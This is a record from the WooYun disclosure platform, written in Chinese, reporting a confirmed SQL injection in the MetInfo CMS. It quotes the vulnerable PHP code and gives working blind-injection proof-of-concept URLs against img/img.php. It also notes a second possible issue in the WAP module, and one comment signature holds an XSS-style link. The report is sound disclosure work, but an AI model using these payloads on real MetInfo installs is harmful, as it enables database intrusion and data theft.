{"id": 65761, "wybug_id": "wooyun-2015-0125648", "wybug_title": "Metinfo最新版一处注入及一个小问题", "wybug_corp": "MetInfo", "wybug_author": "玉林嘎", "wybug_date": "2015-07-09 15:24", "wybug_open_date": "2015-10-10 13:10", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-12：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-15：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-09-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-10：\t细节向公众公开  简要描述： rt 详细说明：  metinfo最新版1、注入漏洞文件:/include/global/listmod.php截取关键代码\nrequire_once substr(dirname(__FILE__), 0, -6).'common.inc.php';require_once '../include/global/pseudo.php';if($dbname!=$met_download&&$dbname!=$met_img&&$dbname!=$met_news&&$dbname!=$met_product){okinfo('../404.html');exit();}if($class_list[$class1]['module']>=100||($class1==0&&$class2==0&&$class3==0)||$class1==10001){\tif($search==\"search\"){\t\t$search_module=$imgproduct=='product'?3:5;\t\tif($searchtype)$search_module=$searchtype;\t\t$query=\"select * from $met_column where module='$search_module' and (classtype=1 or releclass!=0) and lang='$lang' order by no_order ASC,id ASC\";\t\t$search_coloumn=$db->get_all($query);\t\t$class1=$search_coloumn[0]['id'];\t}else{\t\tif($imgproduct){\t\t\t$ipmd = $imgproduct=='product'?100:101;\t\t\tif($imgproduct=='product'){$class1=$productlistid;}\t\t\telse{$class1=$imglistid;}\t\t}\t}}else{\tif(!$class1){\t\tif(!$class2){$class2=$class_list[$class3]['bigclass'];}\t\t$class1=$class_list[$class2]['bigclass'];\t}}if($met_member_use){\t$classaccess=$class3?$class3:($class2?$class2:$class1);\t$classaccess= $db->get_one(\"SELECT * FROM $met_column WHERE id='$classaccess'\");\t$metaccess=$classaccess['access'];}require_once '../include/head.php';if($class1){if(!is_array($class_list[$class1]))okinfo('../404.html');}$pseudos=$db->get_one(\"select * from $met_column where filename='$class2' and lang='$lang'\");if($pseudos){$class2=$pseudos[id];}......$class1_info=$class_list[$class1]['releclass']?$class_list[$class_list[$class1]['releclass']]:$class_list[$class1];$class2_info=$class_list[$class1]['releclass']?$class_list[$class1]:$class_list[$class2];$class3_info=$class_list[$class1]['releclass']?$class_list[$class2]:$class_list[$class3];if(!is_array($class1_info))okinfo('../404.html');$class1sql=\" class1='$class1' \";if($class1&&!$class2&&!$class3){\tforeach($module_list2[$class_list[$class1]['module']] as $key=>$val){\t\tif($val['releclass']==$class1){\t\t\t$class1re.=\" or class1='$val[id]' \";\t\t}\t}\tif($class1re){\t\t$class1sql='('.$class1sql.$class1re.')';\t}}if($imgproduct){\t$ipcom = $imgproduct=='product'?$productcom:$imgcom;\t$serch_sql .=\" where lang='$lang' {$mobilesql} and (recycle='0' or recycle='-1')\";\tif($ipcom=='com')$serch_sql .= \" and com_ok=1\";    if($class1 && $class_list[$class1]['module']<>$ipmd&&$class1!=10001){\t\t$serch_sql .= ' and (('.$class1sql;\t}else{\t\t$serch_sql .= ' and ((1=1';\t}}else{\t$serch_sql=\" where lang='$lang' {$mobilesql} and (recycle='0' or recycle='-1')  and (( $class1sql \";}\n\nif($imgproduct){\t$ipcom = $imgproduct=='product'?$productcom:$imgcom;\t$serch_sql .=\" where lang='$lang' {$mobilesql} and (recycle='0' or recycle='-1')\";\tif($ipcom=='com')$serch_sql .= \" and com_ok=1\";    if($class1 && $class_list[$class1]['module']<>$ipmd&&$class1!=10001){\t\t$serch_sql .= ' and (('.$class1sql;\t}else{\t\t$serch_sql .= ' and ((1=1';\t}}else{\t$serch_sql=\" where lang='$lang' {$mobilesql} and (recycle='0' or recycle='-1')  and (( $class1sql \";}\n$serch_sql之前在这段代码前 包括后面调用这个文件的文件都没声明 所以第一次声明是在下列代码 但是if语句中的 $serch_sql是 $serch_sql .=  这类形式的\nif($imgproduct){\t$ipcom = $imgproduct=='product'?$productcom:$imgcom;\t$serch_sql .=\" where lang='$lang' {$mobilesql} and (recycle='0' or recycle='-1')\";\n导致可以直接控制$serch_sql参数啦  在之后 \n$total_count = $db->counter($dbname, \"$serch_sql\", \"*\");\n进入查询但是前面有一些条件 所以我们需要调用这个文件才行 $imgproduct需满足所以调用/img/img.php这个文件证明:我们在 赋值之后打印出来 看仔细点\n\n\n\n\n\n可以控制http://127.0.0.1/metinfo/img/img.php?class1=1&serch_sql=%201=if%28ascii%28substr%28user%28%29,1,1%29%29=114,1,2%29%23\n\nhttp://127.0.0.1/metinfo/img/img.php?class1=1&serch_sql=%201=if%28ascii%28substr%28user%28%29,1,1%29%29=115,1,2%29%23\n\n   漏洞证明：  另一个小问题/wap/module.php\nswitch($module){\tdefault:\t\t$temp = 'index';\t\t$waptitle=$wap_title;\t\tbreak;\tcase 1:\t\t$temp = 'show';\t\t$dbname = $met_column;\t\tbreak;\tcase 2:\t\t$temp = 'news';\t\t$dbname = $met_news;\t\t$list_num = $wap_news_list;\t\tbreak;\tcase 3:\t\t$temp = 'product';\t\t$dbname = $met_product;\t\t$list_num = $wap_product_list;\t\tbreak;\tcase 4:\t\t$temp = 'download';\t\t$dbname = $met_download;\t\t$list_num = $wap_download_list;\t\tbreak;\tcase 5:\t\t$temp = 'img';\t\t$dbname = $met_img;\t\t$list_num = $wap_img_list;\t\tbreak;\tcase 6:\t\t$temp = 'job';\t\t$dbname = $met_job;\t\t$list_num = $wap_job_list;\t\tbreak;}if($temp != 'index'){$ctitle = $db->get_one(\"select * from $dbname where lang='$lang' and id = '$id'\");if(!$id){\t$clname = $class1?'class1':($class2?'class2':'class3');\t$classwap = $class1?$class1:($class2?$class2:$class3);\t$qtext = $met_wap_ok?\"and wap_ok='1'\":'';\t$serch_sql=\" where lang='$lang' and $clname = '$classwap' $qtext\";\tif($module==6)$serch_sql=\" where lang='$lang' $qtext\";\t$order_sql=$class3?list_order($class_list[$class3]['list_order']):($class2?list_order($class_list[$class2]['list_order']):list_order($class_list[$class1]['list_order']));\tif($module==6)$order_sql='order by no_order desc,addtime desc';\t$total_count = $db->counter($dbname, \"$serch_sql\", \"*\");\t$totaltop_count = $db->counter($dbname, \"$serch_sql and top_ok='1'\", \"*\");\trequire_once '../include/pager.class.php';    $page = (int)$page;\tif($page_input){$page=$page_input;}    $rowset = new Pager($total_count,$list_num,$page);    $from_record = $rowset->_offset();\t$page = $page?$page:1;\tif($module==6){\t\t$query = \"SELECT * FROM $dbname $serch_sql and access='0' $order_sql LIMIT $from_record, $list_num\";\t}else{\t\t$query = \"SELECT * FROM $dbname $serch_sql and top_ok='1' and access='0' and (recycle='0' or recycle='-1') $order_sql LIMIT $from_record, $list_num\";\t}\n$list_num参数 如果进入case 1 就可以控制\n\n本以为 是个limit注入 \n\n在这个表中 根本没这些 字段...   修复方案：  过滤   版权声明：转载请注明来源 玉林嘎@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-07-12 13:08 厂商回复： 是系统漏洞，后续版本修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-07-09 15:40 |    \t\tanswer \t\t\t( 普通白帽子  |\t\t\t        Rank:359 漏洞数:46        | 答案)\t\t \n  牛逼    \n     2015-07-09 15:52 |    \t\t無名老人 \t\t\t( 路人 |\t\t\t        Rank:15 漏洞数:3        | 干过开发，日过渗透，江湖人称： 少女杀手)\t\t \n  看来你已经拿到源码开始审计了啊， 今天拿到份5.2 的源码。 正准备搞呢。。    \n     2015-07-09 17:25 |    \t\t玉林嘎 \t\t\t( 普通白帽子  |\t\t\t        Rank:768 漏洞数:97        )\t\t \n  通用的速度 感动啊！    \n     2015-07-10 11:18 |    \t\t牛肉包子 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:64        )\t\t \n  2K？    \n     2015-07-10 11:35 |    \t\t玉林嘎 \t\t\t( 普通白帽子  |\t\t\t        Rank:768 漏洞数:97        )\t\t \n  @牛肉包子 嗯    \n     2015-07-10 15:14 |    \t\tCheery \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | 0.0)\t\t \n  大牛 带我飞    \n     2015-07-12 14:16 |    \t\t黑暗游侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:1780 漏洞数:268        | 123)\t\t \n  玉总带我飞好么    \n     2015-07-12 15:50 |    \t\tDloveJ \t\t\t( 普通白帽子  |\t\t\t        Rank:1107 漏洞数:200        | <a href=javascrip:alert('xss')>s</a> 点...)\t\t \n  @玉林嘎 带我飞⊙﹏⊙    \n     2015-07-12 20:36 |    \t\tmenmen519 \t\t\t( 普通白帽子  |\t\t\t        Rank:762 漏洞数:146        | http://menmen519.blog.sohu.com/)\t\t \n  求带飞    \n     2015-09-15 13:19 |    \t\tmenmen519 \t\t\t( 普通白帽子  |\t\t\t        Rank:762 漏洞数:146        | http://menmen519.blog.sohu.com/)\t\t \n  http://wooyun.org/bugs/wooyun-2010-0119166 跟这个一模一样的    \n     2015-09-15 13:30 |    \t\t玉林嘎 \t\t\t( 普通白帽子  |\t\t\t        Rank:768 漏洞数:97        )\t\t \n  @menmen519 我看到你那个公开之后 发现差不多的问题 就是入口不一样而已    \n     2015-09-15 13:31 |    \t\tmenmen519 \t\t\t( 普通白帽子  |\t\t\t        Rank:762 漏洞数:146        | http://menmen519.blog.sohu.com/)\t\t \n  @玉林嘎 哦  呵呵 反正2k到手 哈哈     \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}